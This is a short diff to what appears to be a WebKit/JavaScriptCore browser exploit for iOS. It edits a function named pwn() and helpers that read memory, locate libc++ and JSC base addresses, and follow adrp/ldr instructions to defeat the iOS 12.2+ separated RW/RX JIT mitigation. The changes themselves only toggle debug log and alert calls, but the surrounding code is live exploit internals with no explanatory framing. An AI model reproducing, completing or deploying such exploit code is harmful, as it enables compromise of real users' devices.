@@ -264,8 +264,9 @@ function resolve_symbol_addresses(macho_base, names) {
 }
 
 function obtain_libcpp_base(vtab_addr) {
-    log(`vtab_addr: ${vtab_addr}`)
     var adrpldr_ZSt7nothrow_addr = Sub(vtab_addr, vtab_addr.lo() & 0xfff);
+    // log(`adrpldr_ZSt7nothrow_addr: ${adrpldr_ZSt7nothrow_addr} -> ${read64(adrpldr_ZSt7nothrow_addr)}`)
+    // alert(1);
     adrpldr_ZSt7nothrow_addr = Sub(adrpldr_ZSt7nothrow_addr, offsets.webcore_libcpp_ref_gadget_off);
 
     var try_count = 0;
@@ -746,7 +747,7 @@ function pwn() {
     // needed to bypass seperated RW, RX JIT mitigation
     
     if(startOfFixedExecutableMemoryPoolImpl_addr) { //iOS 12.2 or later
-        var __MergedGlobals_52_addr = follow_adrpLdr(Add(jsc_base, startOfFixedExecutableMemoryPoolImpl_addr));alert(2);
+        var __MergedGlobals_52_addr = follow_adrpLdr(Add(jsc_base, startOfFixedExecutableMemoryPoolImpl_addr));
         __MergedGlobals_52_addr = Sub(__MergedGlobals_52_addr, jsc_base);
         log(`[+] __MergedGlobals_52: ${__MergedGlobals_52_addr}`);
         var __MergedGlobals_52 = read64(Add(jsc_base, __MergedGlobals_52_addr));
